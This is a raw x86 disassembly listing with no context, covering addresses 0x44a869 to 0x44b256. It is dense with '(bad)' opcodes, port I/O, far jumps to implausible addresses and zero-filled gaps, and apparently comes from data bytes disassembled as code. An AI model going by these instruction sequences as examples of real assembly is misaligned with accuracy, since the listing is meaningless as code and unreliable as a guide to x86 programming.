  44a869:	outs   dx,BYTE PTR ds:[esi]
  44a86a:	jbe    0x44a882
  44a86c:	in     al,0x76
  44a86e:	(bad)  
  44a86f:	out    0xb8,eax
  44a871:	out    0xf7,eax
  44a873:	push   DWORD PTR [edi-0x19e98a7b]
  44a879:	jo     0x44a879
  44a87b:	out    0x7c,eax
  44a87d:	out    0xf7,eax
  44a87f:	inc    DWORD PTR [eax]
	...
  44a89d:	add    BYTE PTR [edi-0x7b],dh
  44a8a0:	jne    0x44a8b8
  44a8a2:	mov    bh,0x70
  44a8a4:	(bad)  
  44a8a5:	out    0x90,eax
  44a8a7:	out    0xf7,eax
  44a8a9:	jmp    DWORD PTR [edi-0x7b]
  44a8ac:	jne    0x44a8c4
  44a8ae:	mov    eax,0x54e7fe70
  44a8b3:	out    0xf7,eax
  44a8b5:	dec    DWORD PTR ds:0xfb7a809a
  44a8bb:	jecxz  0x44a92c
  44a8bd:	add    dh,BYTE PTR [ebp+0x4b]
  44a8c0:	idiv   eax
  44a8c2:	sbb    BYTE PTR [edx-0x21dc8580],0x76
  44a8c9:	add    ah,BYTE PTR [ebp+0x5f]
  44a8cc:	idiv   eax
  44a8ce:	push   0x1a
  44a8d0:	mov    DWORD PTR [edx+0x7],eax
  44a8d3:	fdivr  DWORD PTR [edi]
  44a8d5:	sbb    eax,0xfe219c8e
  44a8da:	dec    edi
  44a8db:	aas    
  44a8dc:	mov    ebx,0x81464af5
  44a8e1:	jp     0x44a8fe
  44a8e3:	xlat   BYTE PTR ds:[ebx]
  44a8e4:	outs   dx,DWORD PTR ds:[esi]
  44a8e5:	add    ah,BYTE PTR ds:0x32f8f7c3
  44a8eb:	sbb    al,BYTE PTR [ecx+0x6fd8037a]
  44a8f1:	add    dh,BYTE PTR ds:0x1af8f777
  44a8f7:	sbb    al,BYTE PTR [ecx+0x6fd8fb7a]
  44a8fd:	pmaddwd mm6,QWORD PTR [ebx+0xf8fa]
	...
  44a920:	add    bl,BYTE PTR [edx+0x77]
  44a923:	push   es
  44a924:	push   cs
  44a925:	imul   edx,DWORD PTR [ebx-0x18],0x44
  44a929:	fdivr  st(5),st
  44a92b:	clc    
  44a92c:	into   
  44a92d:	pop    ecx
  44a92e:	js     0x44a942
  44a930:	push   cs
  44a931:	push   esp
  44a932:	(bad)  
  44a933:	out    0x18,eax
  44a935:	aam    0xf5
  44a937:	clc    
  44a938:	into   
  44a939:	pop    ecx
  44a93a:	js     0x44a94e
  44a93c:	adc    DWORD PTR [ebx+edx*1],ebp
  44a93f:	call   0xf93a6a3b
  44a944:	mov    ?,WORD PTR [ebx]
  44a946:	or     bh,ch
  44a948:	ds out dx,al
  44a94a:	in     al,0x21
  44a94c:	test   al,0xff
  44a94e:	mov    eax,ds:0x1b8061fa
  44a953:	adc    cl,BYTE PTR [esi]
  44a955:	jae    0x44a940
  44a957:	jmp    0x44a951
  44a959:	jmp    0x1203:0x80c9fa89
  44a960:	(bad)  
  44a962:	fsubr  st,st(3)
  44a964:	or     eax,0xf1fa71ea
  44a969:	push   0xffffffdd
  44a96b:	push   es
  44a96c:	loope  0x44a969
  44a96e:	dec    esi
  44a96f:	push   es
  44a970:	data16 in al,dx
  44a972:	pop    ecx
  44a973:	(bad)  
  44a974:	jb     0x44a960
  44a976:	push   edx
  44a977:	cli    
  44a978:	push   ebp
  44a979:	rcr    BYTE PTR [ebp+0x40],0x23
  44a97d:	jmp    FWORD PTR [ebx+0x642c026]
  44a983:	pop    es
	...
  44a9a0:	add    BYTE PTR [eax],al
  44a9a2:	js     0x44a97b
  44a9a4:	add    dh,bh
  44a9a6:	xor    eax,0xff7865ec
  44a9ab:	call   FWORD PTR [ebx+0x1ade3501]
  44a9b1:	cli    
  44a9b2:	adc    eax,0xff7865c0
  44a9b7:	(bad)  
  44a9b8:	xchg   ebx,eax
  44a9b9:	add    ebp,esi
  44a9bb:	aad    0x2
  44a9bd:	cli    
  44a9be:	add    eax,0x1f7865c0
  44a9c3:	(bad)  
  44a9c4:	jnp    0x44a9da
  44a9c6:	in     eax,0xbe
  44a9c8:	out    dx,eax
  44a9c9:	stc    
  44a9ca:	in     eax,0x7f
  44a9cc:	arpl   WORD PTR [esi],cx
  44a9ce:	loopne 0x44aa3f
  44a9d0:	xor    eax,0xd1ec94ec
  44a9d5:	stc    
  44a9d6:	xchg   ecx,eax
  44a9d7:	jg     0x44aa24
  44a9d9:	adc    cl,al
  44a9db:	je     0x44a9c6
  44a9dd:	jmp    0x44aa4f
  44a9df:	in     al,dx
  44a9e0:	mov    ecx,0xff7f79f9
  44a9e5:	xor    ebx,DWORD PTR [edi]
  44a9e7:	add    al,0x73
  44a9e9:	fdiv   DWORD PTR [esi-0x5b590978]
  44a9ef:	ins    BYTE PTR es:[edi],dx
  44a9f0:	jnp    0x44a9e5
  44a9f2:	adc    DWORD PTR [ecx+ebp*1-0x7f],esi
  44a9f6:	jo     0x44a9df
  44a9f8:	clc    
  44a9f9:	mov    ss,WORD PTR [eax+0x6c]
  44a9fc:	jnp    0x44a9dd
  44a9fe:	sub    DWORD PTR [esi+0x2],0xffffff91
  44aa02:	test   bh,ah
  44aa04:	clc    
  44aa05:	jbe    0x44aa07
	...
  44aa23:	add    BYTE PTR [eax+0x6c],cl
  44aa26:	jnp    0x44a9ff
  44aa28:	or     al,0x6f
  44aa2a:	sqrtps xmm4,xmm5
  44aa2d:	repnz clc 
  44aa2f:	pop    esi
  44aa30:	nop
  44aa31:	pushw  es
  44aa33:	jmp    0xe842:0xd1e7fbe2
  44aa3a:	clc    
  44aa3b:	sub    dh,BYTE PTR [ecx]
  44aa3d:	pop    ebp
  44aa3e:	cld    
  44aa3f:	ds xor al,0xac
  44aa42:	test   BYTE PTR [eax+edx*1-0x6ff5bc15],ch
  44aa49:	ds sbb eax,0x9ce349ea
  44aa4f:	and    BYTE PTR [eax+ebp*8],dl
  44aa52:	jl     0x44a9e8
  44aa54:	cld    
  44aa55:	push   DWORD PTR [edx-0x19]
  44aa58:	not    BYTE PTR [eax-0x4]
  44aa5b:	push   es
  44aa5c:	add    al,0xac
  44aa5e:	jl     0x44aadc
  44aa60:	sbb    al,0xeb
  44aa62:	jae    0x44aa53
  44aa64:	out    0x44,al
  44aa66:	cld    
  44aa67:	out    dx,al
  44aa68:	in     eax,0xab
  44aa6a:	jl     0x44aad0
  44aa6c:	(bad)  
  44aa6d:	jmp    0x302b9ee5
  44aa72:	not    esi
  44aa74:	aad    0x6b
  44aa76:	jnp    0x44aa5b
  44aa78:	adc    ecx,edi
  44aa7a:	add    DWORD PTR [eax],0x4f
  44aa7d:	add    al,0x0
  44aa7f:	add    ah,bl
  44aa81:	pop    ss
  44aa82:	cld    
  44aa83:	(bad)  
  44aa84:	jnp    0x44aa49
  44aa86:	jnp    0x44ab05
	...
  44aaa4:	add    BYTE PTR [eax],al
  44aaa6:	ret    0x6d03
  44aaa9:	sbb    eax,0xffa7237
  44aaae:	add    DWORD PTR [edi],ecx
  44aab0:	call   0xf82c27cb
  44aab5:	sbb    DWORD PTR [ecx],0xfffffffa
  44aab8:	cli    
  44aab9:	jae    0x44aae5
  44aabb:	fmul   QWORD PTR [edx]
  44aabd:	cld    
  44aabe:	sti    
  44aabf:	out    0xbb,eax
  44aac1:	call   0x3c9d2e
  44aac6:	mov    bh,0x83
  44aac8:	jne    0x44aae0
  44aaca:	jo     0x44ab25
  44aacc:	(bad)  
  44aacd:	out    0x64,eax
  44aacf:	repnz idiv edi
  44aad2:	daa    
  44aad3:	test   BYTE PTR [ebp+0x16],dh
  44aad6:	xor    DWORD PTR [ecx-0x2],ebx
  44aad9:	out    0x0,eax
  44aadb:	in     al,dx
  44aadc:	idiv   edi
  44aade:	out    0x83,eax
  44aae0:	jne    0x44aaf8
  44aae2:	and    bl,BYTE PTR [ecx+0x9]
  44aae5:	call   0x3c91bf
  44aaea:	mov    bh,0x71
  44aaec:	add    al,BYTE PTR [ebx]
  44aaee:	adc    BYTE PTR ds:0xe7ffdde8,0xf7
  44aaf5:	ret    
  44aaf6:	ja     0x44ab6a
  44aaf8:	push   cs
  44aaf9:	pop    es
  44aafa:	adc    DWORD PTR [eax],0xde67d7b
  44ab00:	ins    DWORD PTR es:[edi],dx
  44ab01:	adc    DWORD PTR [ecx+ebp*4],ecx
  44ab04:	lock (bad) 
  44ab06:	sti    
  44ab07:	jge    0x44ab7e
  44ab09:	or     al,BYTE PTR [eax]
	...
  44ab27:	add    bh,dh
  44ab29:	pop    ecx
  44ab2a:	or     al,0xe8
  44ab2c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44ab2d:	in     eax,0xf7
  44ab2f:	dec    DWORD PTR ds:0xc6b5eb96
  44ab35:	mov    edx,0x1c96bcf0
  44ab3a:	push   ss
  44ab3b:	call   DWORD PTR [ecx-0xa]
  44ab3e:	jl     0x44ab82
  44ab40:	out    dx,al
  44ab41:	aad    0xbd
  44ab43:	out    0xb6,eax
  44ab45:	scas   eax,DWORD PTR es:[edi]
  44ab46:	lock clc 
  44ab48:	mov    fs,WORD PTR [edx+ecx*1]
  44ab4b:	add    BYTE PTR [eax],ah
  44ab4d:	hlt    
  44ab4e:	in     al,0x90
  44ab50:	xchg   ebp,eax
  44ab51:	xchg   edx,eax
  44ab52:	lock jl 0x44ab5d
  44ab55:	(bad)  
  44ab57:	or     BYTE PTR [eax+0xd000437],cl
  44ab5d:	pop    DWORD PTR [eax-0x428d8d0c]
  44ab63:	jl     0x44ab4d
  44ab65:	rol    BYTE PTR [ebx],1
  44ab67:	jae    0x44ab61
  44ab69:	dec    esi
  44ab6a:	js     0x44ab64
  44ab6c:	pop    edx
  44ab6d:	dec    edx
  44ab6e:	jge    0x44abea
  44ab70:	pop    es
  44ab71:	(bad)  
  44ab72:	add    DWORD PTR [ebx-0x32870],eax
  44ab78:	xor    eax,0x3af8f5ab
  44ab7d:	push   ss
  44ab7e:	jge    0x44abfa
  44ab80:	sbb    edx,ebp
  44ab82:	outs   dx,DWORD PTR ds:[esi]
  44ab83:	adc    esi,DWORD PTR ds:0x22f8f4b8
  44ab89:	push   esi
  44ab8a:	ja     0x44ab92
	...
  44aba8:	add    BYTE PTR [eax],al
  44abaa:	push   cs
  44abab:	fidivr DWORD PTR [edi+0x65]
  44abae:	or     eax,0x64e7fcd7
  44abb3:	push   cs
  44abb4:	icebp  
  44abb5:	clc    
  44abb6:	into   
  44abb7:	push   ebp
  44abb8:	ja     0x44abcc
  44abba:	push   cs
  44abbb:	je     0x44abd1
  44abbd:	call   0xf9369b0d
  44abc2:	mov    ds,WORD PTR [ebx+0x7]
  44abc5:	std    
  44abc6:	pop    ecx
  44abc7:	add    BYTE PTR [esi],dh
  44abc9:	in     al,dx
  44abca:	sbb    ch,ah
  44abcc:	fdecstp 
  44abce:	xchg   ecx,eax
  44abcf:	jl     0x44ac24
  44abd1:	push   cs
  44abd2:	adc    DWORD PTR [ebx-0x1f],esi
  44abd5:	jmp    0x44abd3
  44abd7:	in     al,0xc1
  44abd9:	idiv   BYTE PTR [ecx+0x7c]
  44abdc:	cmp    ecx,DWORD PTR [esi]
  44abde:	push   cs
  44abdf:	jae    0x44abb9
  44abe1:	jmp    0x44abec
  44abe3:	call   0x6b66a291
  44abe8:	in     eax,dx
  44abe9:	add    bl,BYTE PTR [esi]
  44abeb:	xor    BYTE PTR [edi-0x6e1767ea],cl
  44abf1:	ret    0x6b09
  44abf4:	icebp  
  44abf5:	std    
  44abf6:	dec    DWORD PTR [esi]
  44abf8:	pop    DWORD PTR [edi]
  44abfa:	jne    0x44abe4
  44abfc:	jns    0x44ab80
  44abfe:	div    ebp
  44ac00:	in     eax,0x70
  44ac02:	add    bl,al
  44ac04:	fdivp  st(2),st
  44ac06:	gs call 0x121c2e31
  44ac0c:	loop   0x44ac84
	...
  44ac2a:	add    BYTE PTR [eax],al
  44ac2c:	or     al,0xd8
  44ac2e:	pop    ebx
  44ac2f:	out    dx,al
  44ac30:	inc    ebp
  44ac31:	call   0xf26fa973
  44ac36:	cmp    al,0xf6
  44ac38:	xor    eax,0x1b406dbc
  44ac3d:	jmp    FWORD PTR [ebx+0x642a822]
  44ac43:	add    ah,BYTE PTR [eax-0x29]
  44ac46:	enter  0x15fb,0xe8
  44ac4a:	gs js  0x44ac4c
  44ac4d:	call   FWORD PTR [ebx+0x11d2f514]
  44ac53:	test   BYTE PTR ds:0xf8098384,0x6c
  44ac5a:	cwde   
  44ac5b:	jmp    0x44ac21
  44ac5d:	jmp    0x6c7c:0xa4e0f5ff
  44ac64:	adc    bh,ah
  44ac66:	jae    0x44ac60
  44ac68:	out    0xac,al
  44ac6a:	lock (bad) 
  44ac6d:	fs jnp 0x44ac53
  44ac70:	or     eax,0x70c13673
  44ac75:	in     eax,dx
  44ac76:	clc    
  44ac77:	(bad)  
  44ac78:	int3   
  44ac79:	fs jnp 0x44ac53
  44ac7c:	or     al,0x73
  44ac7e:	xadd   DWORD PTR [ebp-0x10],ebp
  44ac82:	clc    
  44ac83:	scas   al,BYTE PTR es:[edi]
  44ac84:	mov    WORD PTR [edx+0x6],gs
  44ac87:	jmp    0xe897:0x49e8052b
  44ac8e:	clc    
  44ac8f:	stos   BYTE PTR es:[edi],al
	...
  44acac:	add    BYTE PTR [eax],al
  44acae:	mov    WORD PTR [edx+0x12],gs
  44acb1:	jmp    0xe868:0x74e7f6f3
  44acb8:	clc    
  44acb9:	push   0xfffffffa
  44acbb:	std    
  44acbc:	cld    
  44acbd:	sti    
  44acbe:	adc    bl,al
  44acc0:	xchg   BYTE PTR [ebx+0x58],dh
  44acc3:	call   0xedd0fe84
  44acc8:	clc    
  44acc9:	pop    esi
  44acca:	dec    esp
  44accb:	jl     0x44ad0f
  44accd:	repz cmovae ebx,DWORD PTR ds:0xfe05026a
  44acd5:	sub    DWORD PTR [eax+0x42],eax
  44acd8:	sbb    eax,0x8e5f226
  44acdd:	jmp    0xa53eacf0
  44ace2:	in     al,dx
  44ace3:	jg     0x44ad5f
  44ace5:	retf   
  44ace6:	adc    DWORD PTR [ebx+0x2],esi
  44ace9:	adc    DWORD PTR [eax-0x33e90713],edi
  44acef:	jnp    0x44ad33
  44acf1:	retf   0xb209
  44acf4:	pop    es
  44acf5:	add    BYTE PTR [ecx-0x1bfc7a00],al
  44acfb:	jg     0x44acb5
  44acfd:	add    al,0xe3
  44acff:	sar    BYTE PTR [edi+0x22f645],cl
  44ad05:	add    ah,ah
  44ad07:	mov    edi,0xee0745f7
  44ad0c:	cmp    eax,0x1a6e3422
  44ad11:	sldt   WORD PTR [eax]
	...
  44ad30:	pop    ecx
  44ad31:	out    0xe0,al
  44ad33:	xor    eax,0xc3f7ebce
  44ad38:	aas    
  44ad39:	ds (bad) 
  44ad3b:	ror    ch,1
  44ad3d:	jns    0x44ad94
  44ad3f:	push   es
  44ad40:	das    
  44ad41:	sbb    ecx,DWORD PTR es:[edi]
  44ad44:	cmp    bh,bl
  44ad46:	test   BYTE PTR [edx+eiz*1],al
  44ad49:	add    BYTE PTR [eax],al
  44ad4b:	xor    DWORD PTR [esi+eiz*8+0x4defd0f7],0xfffffffe
  44ad53:	rol    BYTE PTR [ebp-0x58f9ba87],1
  44ad59:	jmp    0x44ad98
  44ad5b:	and    esp,edx
  44ad5d:	and    eax,0x2071801a
  44ad62:	pop    es
  44ad63:	jne    0x44adcf
  44ad65:	(bad)  
  44ad67:	stc    
  44ad68:	mov    bl,0xeb
  44ad6a:	mov    ebx,0x71f798b
  44ad6f:	mov    dh,0x34
  44ad71:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  44ad73:	je     0x44adcb
  44ad75:	cs lahf 
  44ad77:	je     0x44ad9b
  44ad79:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  44ad7b:	je     0x44adab
  44ad7d:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  44ad7f:	je     0x44adab
  44ad81:	cs pop es
  44ad83:	je     0x44adab
  44ad85:	xlat   BYTE PTR ds:[ebx]
  44ad86:	cld    
  44ad87:	lds    ebp,FWORD PTR [ecx+0x2]
  44ad8a:	stc    
  44ad8b:	mov    cl,BYTE PTR ds:0xbb091f94
  44ad91:	fild   WORD PTR [ecx+0x3]
	...
  44adaf:	add    BYTE PTR [eax],al
  44adb1:	add    BYTE PTR [ebx-0x32830326],cl
  44adb7:	fcomi  st,st(3)
  44adb9:	iret   
  44adba:	rcl    DWORD PTR [esp+edi*8+0x3ad6ceff],cl
  44adc1:	sbb    eax,0x802214db
  44adc6:	push   eax
  44adc7:	stc    
  44adc8:	cld    
  44adc9:	jb     0x44adde
  44adcb:	mov    edi,0xb6c2f6a8
  44add0:	rol    BYTE PTR [eax+edx*2+0xdb1fcfa],0xe3
  44add8:	mov    WORD PTR [ebx-0x15],?
  44addb:	jmp    0x73a7:0xd2e773a0
  44ade2:	jecxz  0x44adbe
  44ade4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44ade5:	jae    0x44adc6
  44ade7:	ret    0x73a5
  44adea:	cmp    ecx,ebx
  44adec:	call   0x3373:0x99b33773
  44adf3:	mov    ebx,0xa32f7398
  44adf8:	lahf   
  44adf9:	jae    0x44ae06
  44adfb:	stos   DWORD PTR es:[edi],eax
  44adfc:	sahf   
  44adfd:	jae    0x44ae06
  44adff:	xchg   ebx,eax
  44ae00:	popf   
  44ae01:	jae    0x44ae06
  44ae03:	sbb    esp,DWORD PTR [eax+0x74]
  44ae06:	inc    DWORD PTR [edx]
  44ae08:	pop    edi
  44ae09:	je     0x44ae26
  44ae0b:	or     ebx,DWORD PTR [esi+0x74]
  44ae0e:	pop    ss
  44ae0f:	repz pop esp
  44ae11:	je     0x44ae26
  44ae13:	sti    
  44ae14:	cld    
  44ae15:	jae    0x44ae17
	...
  44ae33:	add    BYTE PTR [edi],cl
  44ae35:	push   edx
  44ae36:	or     dl,al
  44ae38:	rcl    bh,1
  44ae3a:	add    eax,DWORD PTR [ebp-0x4e030638]
  44ae40:	add    eax,0x87087400
  44ae45:	add    edi,esp
  44ae47:	xchg   dl,cl
  44ae49:	sti    
  44ae4a:	adc    esp,edx
  44ae4c:	int3   
  44ae4d:	cmp    ch,al
  44ae4f:	add    edi,DWORD PTR [eax-0x8d9541c]
  44ae55:	cmp    al,ch
  44ae57:	and    DWORD PTR [edi+0x22],0xffffffe2
  44ae5b:	js     0x44ae6c
  44ae5d:	fcomp  DWORD PTR [esi-0x5a1b2a14]
  44ae63:	jle    0x44aeb4
  44ae65:	and    edx,ebp
  44ae67:	mov    ecx,0x816a7312
  44ae6c:	ret    0xe700
  44ae6f:	add    edi,DWORD PTR [eax+0xec365e4]
  44ae75:	in     eax,0x96
  44ae77:	(bad)  
  44ae78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44ae79:	cmp    al,BYTE PTR [esi]
  44ae7b:	repnz dec edi
  44ae7d:	and    ah,BYTE PTR [edi+0x70]
  44ae80:	sti    
  44ae81:	hlt    
  44ae82:	sbb    ecx,DWORD PTR [edx]
  44ae84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44ae85:	push   ds
  44ae86:	mov    al,ds:0x5dc085f2
  44ae8b:	dec    eax
  44ae8c:	and    ch,dh
  44ae8e:	push   eax
  44ae8f:	sti    
  44ae90:	xchg   DWORD PTR [ebx+0x70],edi
  44ae93:	add    eax,DWORD PTR ds:0x6e700
	...
  44aeb5:	add    BYTE PTR ds:0x6407a681,cl
  44aebb:	iret   
  44aebc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44aebd:	repnz iret 
  44aebf:	and    BYTE PTR [ecx+0x48],ah
  44aec2:	repz jg 0x44aea0
  44aec5:	and    eax,0xdbe96b14
  44aeca:	cmp    bh,ah
  44aecc:	dec    ecx
  44aecd:	bnd jns 0x44af48
  44aed0:	stos   DWORD PTR es:[edi],eax
  44aed1:	es add al,0xae
  44aed4:	out    dx,al
  44aed5:	or     BYTE PTR [esi+0x22e8ff75],0xe4
  44aedc:	clc    
  44aedd:	jmp    0xb41f:0xedc0630e
  44aee4:	mov    esp,0xa5526
  44aee9:	jmp    0xa4c9aefc
  44aeee:	xor    edi,ecx
  44aef0:	mov    cl,0xa9
  44aef2:	or     DWORD PTR [edi],esp
  44aef4:	mov    ecx,0x79000ee9
  44aef9:	fadd   st,st(6)
  44aefb:	div    ecx
  44aefd:	out    dx,al
  44aefe:	fsub   QWORD PTR [ebx+edi*2-0x1]
  44af02:	add    eax,0x7cd10266
  44af07:	jmp    0x44af01
  44af09:	(bad)  
  44af0a:	enter  0xaddb,0xd4
  44af0e:	mov    esp,0x32c84e8
  44af13:	jecxz  0x44af58
  44af15:	or     dl,BYTE PTR [eax+0xeb1d3e]
	...
  44af37:	add    cl,cl
  44af39:	rol    BYTE PTR [edx-0x2d],0xe
  44af3d:	add    BYTE PTR [eax],al
  44af3f:	jmp    0xee61ed55
  44af44:	les    esp,FWORD PTR [ebx]
  44af46:	call   ebx
  44af48:	mov    ebp,0xfde9f8e3
  44af4d:	adc    al,ch
  44af4f:	lahf   
  44af50:	jp     0x44af3a
  44af52:	clc    
  44af53:	push   0xfffffffa
  44af55:	or     eax,0x64c7fbff
  44af5a:	jnp    0x44af33
  44af5c:	add    eax,0x88515d66
  44af61:	jmp    0x44af5b
  44af63:	pop    esi
  44af64:	push   eax
  44af65:	es shr cl,0xe
  44af69:	add    BYTE PTR [edi+esi*4-0x49],bh
  44af6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44af6e:	mov    esi,0x80f7de00
  44af73:	shl    DWORD PTR [edi-0x217cf822],0xe2
  44af7a:	ins    DWORD PTR es:[edi],dx
  44af7b:	or     esp,DWORD PTR [edi+0x6673f8d6]
  44af81:	(bad)  
  44af82:	pop    edx
  44af83:	clc    
  44af84:	sub    esi,ecx
  44af86:	mov    ebx,0x6cfe1e83
  44af8b:	aaa    
  44af8c:	xlat   BYTE PTR ds:[bx]
  44af8e:	cli    
  44af8f:	je     0x44af73
  44af91:	(bad)  
  44af92:	dec    edx
  44af93:	clc    
  44af94:	jmp    0x44af85
  44af96:	mov    ebx,0x6cfbdd83
  44af9b:	push   es
	...
  44afb8:	add    BYTE PTR [eax],al
  44afba:	or     al,0x39
  44afbc:	clc    
  44afbd:	(bad)  
  44afbe:	jmp    0x44af7b
  44afc0:	jnp    0x44afbb
  44afc2:	mov    dl,0x69
  44afc4:	(bad)  
  44afc5:	out    0x18,eax
  44afc7:	aam    0xf7
  44afc9:	jmp    DWORD PTR [edi+0x7b]
  44afcc:	icebp  
  44afcd:	pop    es
  44afce:	icebp  
  44afcf:	cmc    
  44afd0:	out    0x31,eax
  44afd2:	int3   
  44afd3:	out    dx,eax
  44afd4:	test   ebx,0x7507d637
  44afda:	mov    dl,0xc6
  44afdc:	push   ds
  44afdd:	clc    
  44afde:	imul   ebp,edi,0xffffffbb
  44afe1:	call   0x3c9af3
  44afe6:	out    dx,eax
  44afe7:	cmp    DWORD PTR [edx],edx
  44afe9:	add    DWORD PTR [ecx],esi
  44afeb:	sbb    eax,0xfc47457b
  44aff0:	mov    edx,0xfff231c7
  44aff5:	push   DWORD PTR [esi+edi*8-0x7e]
  44aff9:	inc    ebp
  44affa:	inc    edi
  44affb:	jmp    FWORD PTR [ebp-0x48ee9ac0]
  44b001:	add    BYTE PTR [esi+edi*8],dh
  44b004:	jbe    0x44b017
  44b006:	or     eax,0x3af32a41
  44b00b:	xor    DWORD PTR [edx+edi*2+0x2e6ed21b],eax
  44b012:	xor    eax,0x22f8f828
  44b017:	adc    eax,0xd90dc02a
  44b01c:	cld    
  44b01d:	jnp    0x44b01f
	...
  44b03b:	add    al,ch
  44b03d:	outs   dx,DWORD PTR ds:[esi]
  44b03e:	ret    
  44b03f:	mov    esi,0xbe75dbf7
  44b044:	mov    ?,eax
  44b046:	(bad)  
  44b047:	jl     0x44b040
  44b049:	shl    DWORD PTR [ecx+0x5],0x8e
  44b04d:	add    dh,dh
  44b04f:	jae    0x44b04d
  44b051:	push   cs
  44b052:	shl    al,0xe2
  44b055:	jmp    0x271:0xc2d77cbc
  44b05c:	in     eax,0x93
  44b05e:	lock clc 
  44b060:	retf   0xdb96
  44b063:	mov    al,0xb9
  44b065:	retf   0x84e8
  44b068:	push   eax
  44b069:	in     eax,dx
  44b06a:	add    eax,DWORD PTR [ebx-0x12]
  44b06d:	push   ebp
  44b06e:	inc    edi
  44b06f:	sbb    eax,0x42c0960f
  44b074:	pop    es
  44b075:	xlat   BYTE PTR ds:[ebx]
  44b076:	cld    
  44b077:	dec    DWORD PTR ds:0x21d475e
  44b07d:	inc    ecx
  44b07e:	inc    esp
  44b07f:	dec    DWORD PTR [ecx+0x42]
  44b082:	add    al,0x0
  44b084:	or     eax,0x56e8090a
  44b089:	mov    ebp,eax
  44b08b:	clc    
  44b08c:	mov    ?,esp
  44b08e:	adc    DWORD PTR [ecx+eiz*8],eax
  44b091:	sar    BYTE PTR [ebp+0x7a],1
  44b094:	sti    
  44b095:	shl    BYTE PTR [eax+0x8],1
  44b098:	mov    ss,esp
  44b09a:	adc    al,BYTE PTR [ecx]
  44b09c:	sar    bh,cl
  44b09e:	in     al,0xda
	...
  44b0bc:	add    BYTE PTR [eax],al
  44b0be:	or     ebx,eax
  44b0c0:	test   WORD PTR [ebp-0x1f],0x3125
  44b0c6:	dec    ebp
  44b0c7:	add    bh,ah
  44b0c9:	add    esi,DWORD PTR [ecx+0x6bc2702b]
  44b0cf:	(bad)  
  44b0d0:	loop   0x44b14e
  44b0d2:	arpl   WORD PTR [ebp+0x47],di
  44b0d5:	call   FWORD PTR [ecx-0x187271b]
  44b0db:	jl     0x44b0fc
  44b0dd:	cld    
  44b0de:	xchg   DWORD PTR [eax],esp
  44b0e0:	in     ax,dx
  44b0e2:	add    DWORD PTR [ebp-0x12],ebp
  44b0e5:	add    BYTE PTR [ebx],0xfe
  44b0e8:	xchg   edx,eax
  44b0e9:	adc    eax,0xeefa4ae5
  44b0ee:	in     eax,0xbc
  44b0f0:	gs jmp 0xf7e3:0x82de6b15
  44b0f8:	push   0x5
  44b0fa:	in     eax,0x3a
  44b0fc:	(bad)  
  44b0fe:	lds    edi,FWORD PTR [esi+ecx*8-0x2e1f46d5]
  44b105:	jp     0x44b156
  44b107:	push   es
  44b108:	call   0x2bc1c155
  44b10d:	and    ebp,DWORD PTR [ebx-0x4b75e43]
  44b113:	jmp    esi
  44b115:	add    ecx,DWORD PTR ds:0x4232375
  44b11b:	stos   BYTE PTR es:[edi],al
  44b11c:	es add eax,0x3e6a146
	...
  44b13e:	add    BYTE PTR [eax],al
  44b140:	or     eax,0xd6dbf861
  44b145:	jmp    0x44b0d0
  44b147:	out    dx,al
  44b148:	icebp  
  44b149:	(bad)  
  44b14a:	fld    DWORD PTR [esi]
  44b14c:	out    0x1d,eax
  44b14e:	(bad)  
  44b14f:	(bad)  
  44b150:	pop    ebp
  44b151:	loopne 0x44b152
  44b153:	jne    0x44b1a4
  44b155:	and    eax,0xee9c0
  44b15a:	jl     0x44b158
  44b15c:	leave  
  44b15d:	mov    ds:0x790a53be,al
  44b162:	mov    esi,0x7cf7316a
  44b167:	push   ebx
  44b168:	or     eax,0x1f51026d
  44b16d:	out    dx,al
  44b16e:	clc    
  44b16f:	ds dec edi
  44b171:	fsub   st,st(1)
  44b173:	cmp    ch,BYTE PTR [ebx]
  44b175:	out    0x84,eax
  44b177:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44b178:	add    al,0xe1
  44b17a:	inc    ebx
  44b17b:	retf   0x428f
  44b17e:	sbb    eax,0x42c0cfeb
  44b183:	repz push cs
  44b185:	add    BYTE PTR [eax],al
  44b187:	jmp    0xf661f403
  44b18c:	mov    al,ds:0xb3bbff1f
  44b191:	(bad)  
  44b193:	jmp    0xe42ca903
  44b198:	fcmovu st,st(0)
  44b19a:	clc    
  44b19b:	push   0x3a
  44b19d:	repnz add dl,BYTE PTR [ebp-0x3f]
  44b1a1:	pop    esp
  44b1a2:	jnp    0x44b1a3
	...
  44b1c0:	add    BYTE PTR [eax],al
  44b1c2:	adc    DWORD PTR [ecx-0x2],ebx
  44b1c5:	sar    edi,0xe7
  44b1c8:	mov    dl,0xbf
  44b1ca:	mov    eax,0xcefcbcd8
  44b1cf:	(bad)  
  44b1d1:	jmp    0xabcbd500
  44b1d6:	into   
  44b1d7:	in     eax,0x3
  44b1d9:	jo     0x44b229
  44b1db:	pop    esp
  44b1dc:	fucomip st,st(6)
  44b1de:	(bad)  
  44b1df:	aad    0xb
  44b1e1:	sbb    al,0x74
  44b1e3:	pop    esp
  44b1e4:	mul    ecx
  44b1e6:	loop   0x44b1f6
  44b1e8:	call   0xf81a79ed
  44b1ed:	push   DWORD PTR [edi+0x590ff281]
  44b1f3:	add    eax,0xecda89e8
  44b1f8:	test   ebx,0xffeb4fdc
  44b1fe:	jecxz  0x44b258
  44b200:	sbb    ah,BYTE PTR ds:0x69831b46
  44b207:	and    dl,bh
  44b209:	ret    0x46fb
  44b20c:	adc    al,BYTE PTR [eax]
  44b20e:	xor    al,0x3
  44b210:	add    BYTE PTR [ebx-0x49f8df97],cl
  44b216:	add    dh,BYTE PTR fs:0x2f4bf
  44b21d:	jg     0x44b224
  44b21f:	mov    ebx,0xed23f398
  44b224:	jnp    0x44b2a3
	...
  44b242:	add    BYTE PTR [eax],al
  44b244:	cli    
  44b245:	add    esi,DWORD PTR [esi+0x27]
  44b248:	cld    
  44b249:	xor    dh,ch
  44b24b:	jmp    ebx
  44b24d:	mov    edi,0x2e4c035
  44b252:	add    BYTE PTR [esi+edi*4+0x59],bh
  44b256:	mov    ebx,0x8106dec1
